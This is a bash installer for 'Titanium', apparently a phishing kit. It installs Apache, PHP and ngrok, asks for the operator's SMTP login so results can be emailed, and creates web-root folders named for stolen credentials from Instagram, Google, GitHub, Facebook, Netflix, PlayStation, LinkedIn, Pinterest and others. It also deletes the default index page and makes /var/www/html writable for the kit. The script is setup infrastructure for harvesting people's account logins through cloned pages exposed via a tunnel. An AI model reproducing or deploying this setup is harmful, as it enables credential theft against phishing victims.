#!/bin/bash
. /etc/os-release
ARCH="$(arch)"
DIST="$ID"

function banner {
	banner=$(<"Banners/Install.txt")
	printf "$(tput setaf 2)$banner"
}

function installer {
	printf "\n\n$(tput setaf 6)CHECKING LINUX DISTRIBUTION..."
	sleep 2
	printf "$(tput setaf 2)\n\n[+]$(tput setaf 15)LINUX DISTRIBITIUN FOUND:$DIST$(tput setaf 2)[+]"
	printf "$(tput setaf 6)\n\nWELCOME TO THE INSTALLATION MANAGER WOULD YOU LIKE TO BEGIN(1)YES(2)NO\n\n"
	read -p "$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" confvar
	if [ $confvar == 1 ]; 
		then
            apt-get install python3 &> /dev/null | printf "$(tput setaf 15)\nINSTALLING PYTHON3"
            apt-get install python3-pip &> /dev/null | printf "$(tput setaf 15)\n\nINSTALLING PIP"
            apt-get install php &> /dev/null | printf "$(tput setaf 15)\n\nINSTALLING PHP"
            apt-get install curl &> /dev/null | printf "$(tput setaf 15)\n\nINSTALLING CURL"
            apt-get install wget &> /dev/null | printf "$(tput setaf 15)\n\nINSTALLING WGET"
            apt-get install apache2 &> /dev/null | printf "$(tput setaf 15)\n\nINSTALLING APACHE"
			pip3 install -r requirements.txt &> /dev/null | printf "$(tput setaf 6)\n\nINSTALLING-PYTHON-REQUIREMENTS..."
			printf "$(tput setaf 2)\n\n[+]$(tput setaf 15)REQUIREMENTS INSTALLED SUCCESFULLY$(tput setaf 2)[+]"
			printf "$(tput setaf 6)\n\nCHECKING YOUR OS ARCHITECTURE..."
			sleep 2
			printf "$(tput setaf 2)\n\n[+]$(tput setaf 15)SYSTEM ARCHITECTURE DETCTED:$ARCH$(tput setaf 2)[+]"
			if [[ ${ARCH} == "x86_64" || ${ARCH} == "x86_64" ]]; 
				then
					wget -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip &> /dev/null | printf "$(tput setaf 6)\n\nINSTALLING NGROK 64 BIT"
			else
				wget -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-i386.zip &> /dev/null | printf "$(tput setaf 6)\n\nINSTALLING NGROK 32 BIT"
			fi
			unzip ngrok.zip &> /dev/null | printf "$(tput setaf 2)\n\n[+]$(tput setaf 15)SETTING UP NGROK$(tput setaf 2)[+]"
			mv ngrok Tunnel
			rm ngrok.zip
			cd Tunnel
			rm UNTILED.txt &> /dev/null
			cd ../
			printf "$(tput setaf 2)\n\n[+]$(tput setaf 11)NGROK INSTALLED SUCCESSFULLY$(tput setaf 2)[+]"
			printf "$(tput setaf 15)\n\nINSERT YOUR RECIPIENT EMAIL\n\n"
			read -p"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" recipient
			while [ "$recipient" = "" ];
				do
                  printf "$(tput setaf 15)\nINSERT YOUR RECIPIENT EMAIL\n\n"
                  read -p"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" recipient
			done
				printf "$(tput setaf 15)\nINSERT YOUR EMAIL PASSWORD\n\n"
				read -sp"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" password
			while [ "$password" = "" ];
				do
                  printf "$(tput setaf 15)\nINSERT YOUR EMAIL PASSWORD\n\n"
                  read -sp"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" password
            done
				printf "$(tput setaf 15)\n\nINSERT YOUR DESTINATION EMAIL\n\n"
				read -p"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" destination
				while [ "$destination" = "" ];
				do
                  printf "$(tput setaf 15)\nINSERT YOUR DESTINATION EMAIL\n\n"
                  read -p"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" destination
				done
				printf "$(tput setaf 15)\nINSERT YOUR SMTP SERVER EX smtp.test.com\n\n"
				read -p"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" server
				while [ "$server" = "" ];
				do
                  printf "$(tput setaf 15)\nINSERT YOUR SMTP SERVER EX smtp.test.com\n\n"
                  read -p"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" server
				done
				printf "$(tput setaf 15)\nINSERT YOUR SMTP SERVER PORT EX 768\n\n"
				read -p"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" port
				while [ "$port" = "" ];
				do
                  printf "$(tput setaf 15)\nINSERT YOUR SMTP SERVER PORT \n\n"
                  read -p"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" port
				done
				printf "$(tput setaf 15)\nINSERT YOUR UPDATE PASSWORD\n\n"
				read -sp"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" passw
				while [ "$port" = "" ];
				do
                  printf "$(tput setaf 15)\nINSERT YOUR UPDATE PASSWORD \n\n"
                  read -sp"$(tput setaf 2)[*TITANIUM*]$(tput setaf 15)-->" passw
				done
				printf "$(tput setaf 6)\n\nCREATING CONFIGURATION FILE"
				cd Configuration
				echo "[Smtp]">Configuration.ini
				echo "Email = $recipient">>Configuration.ini
				echo "Password = $password">>Configuration.ini
				echo "Destination = $destination">>Configuration.ini
				echo "Server = $server">>Configuration.ini
				echo "Port = $port">>Configuration.ini
				echo "">>Configuration.ini
				echo "[Settings]">>Configuration.ini
				echo "Password = $passw">>Configuration.ini
				rm UNTILED.txt &> /dev/null
				cd ../
				sleep 3
				printf "$(tput setaf 2)\n\n[+]$(tput setaf 11)FILES CREATED SUCCESSFULLY$(tput setaf 2)[+]"
				sleep 2
				chmod +x Titanium.py &> /dev/null | printf "$(tput setaf 6)\n\nGIVING EXECUTION PERMISSION TO Titanium.py"
				chmod +x update.sh &> /dev/null | printf "$(tput setaf 6)\n\nCONFIGURING UPDATE SETTING"
				cd ../
				echo "Path = `pwd`">>Titanium/Configuration/Configuration.ini
				sleep 1
				  printf "$(tput setaf 6)\n\nCREATING TITANIUM FILES DIRECTORY IN /var/www/html"
				  cd /var/www/html
				  rm index.html &> /dev/null | printf "$(tput setaf 6)\n\nDELETING DEFAULT index.html"
				  mkdir Titanium_files  &> /dev/null
				  cd Titanium_files  &> /dev/null
				  mkdir LinkedIn  &> /dev/null
				  mkdir play  &> /dev/null
				  mkdir insta  &> /dev/null
				  mkdir credentials  &> /dev/null
				  cd credentials
				  mkdir Instagram &> /dev/null
				  mkdir Google &> /dev/null
				  mkdir Git-Hub &> /dev/null
				  mkdir Facebook &> /dev/null
				  mkdir Stackoverflow &> /dev/null
				  mkdir Netflix &> /dev/null
				  mkdir Playstation &> /dev/null
				  mkdir Linkedin &> /dev/null
				  mkdir Pinterest &> /dev/null
				  mkdir Custom &> /dev/null
				  sleep 2
				  chown -R www-data:www-data /var/www/html &> /dev/null | printf "$(tput setaf 6)\n\nGIVING WRITE PERMISSION TO /var/www/html"
				  sleep 2
				  printf "$(tput setaf 2)\n\n[+]$(tput setaf 15)PROGRAM INSTALLED CORRECTLY$(tput setaf 2)[+]"
				  printf "$(tput setaf 10)\n\nTHANK YOU FOR HAVE INSTALLED TITANIUM\n\n"
    fi
      exit 1

}
	if [ $(id -u) -ne 0 ]; 
		then
	 		clear
			printf "$(tput setaf 1)\n[!]"$(tput setaf 2)"This script must be run as root""$(tput setaf 1)[!]"
	 		exit 1
	fi
	  clear
	  banner
	  installer
